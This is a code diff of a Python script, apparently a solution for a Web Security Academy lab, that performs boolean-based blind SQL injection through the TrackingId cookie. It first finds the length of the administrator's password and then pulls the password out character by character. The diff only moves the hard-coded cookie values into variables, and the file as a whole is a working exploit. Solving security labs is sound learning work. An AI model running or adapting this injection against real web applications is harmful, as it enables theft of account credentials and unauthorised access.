@@ -12,6 +12,8 @@ def def_handler(sig, frame):
 signal.signal(signal.SIGINT, def_handler)
 
 main_url = "https://0a5a00a503dc786ab77e7e73004b0028.web-security-academy.net/"
+tracking_id = "FmG1ydUVGLNtBRre"
+session = "FmG1ydUVGLNtBRre"
 characters = string.ascii_lowercase + string.digits
 
 def password_lenght_request():
@@ -21,8 +23,8 @@ def password_lenght_request():
     p2 = log.progress('Longitud Contraseña')
     while True:
             cookies = {
-                'TrackingId': "FmG1ydUVGLNtBRre'and (select 'a' from users where username = 'administrator' and length(password) > %d) = 'a" % (counter),
-                'session': 'VzQ06p2sA6B2ol4ylvDxQ6xVppF3Plvk'
+                'TrackingId': f"{tracking_id}'and (select 'a' from users where username = 'administrator' and length(password) > {counter}) = 'a",
+                'session': f'{session}'
             }
             p1.status(cookies['TrackingId'])
             r = requests.get(main_url, cookies=cookies)
@@ -45,8 +47,8 @@ def make_request(longitudContraseña):
     for position in range(1, longitudContraseña + 1):
         for character in characters:
             cookies = {
-                'TrackingId': "LCHJh2iff4MMb6Zo'and (select substring(password, %d, 1) from users where username = 'administrator') = '%s" % (position, character),
-                'session': '55bEYpjquyVN4KNquBPJWMZQTe6WiUeu'
+                'TrackingId': f"{tracking_id}'and (select substring(password, {position}, 1) from users where username = 'administrator') = '{character}",
+                'session': f'{session}'
             }
             p1.status(cookies['TrackingId'])
             p2.status(password)
